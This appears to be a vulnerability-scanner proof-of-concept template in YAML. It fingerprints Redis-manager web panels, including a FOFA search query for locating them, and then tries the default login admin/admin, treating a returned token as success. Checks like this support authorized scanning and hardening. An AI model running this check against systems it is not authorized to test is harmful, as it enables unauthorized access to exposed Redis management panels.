id: poc-yaml-redis-manager-weak-password
info:
  name: Redis-manager 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: redis-manager
  fofa: title="redis-manager"
requests:
- method: GET
  path: /login
  expression: contains(title,"redis-manager")
- method: POST
  path: /user/login
  headers:
    Content-Type: application/json;charset=UTF-8
  data: '{"userName":"admin","password":"admin"}'
  expression: status_code == 200 && contains(body,"code") && contains(body,"success")
    && contains(body,"token") && contains(body,"admin")
variables: {}
transport: http
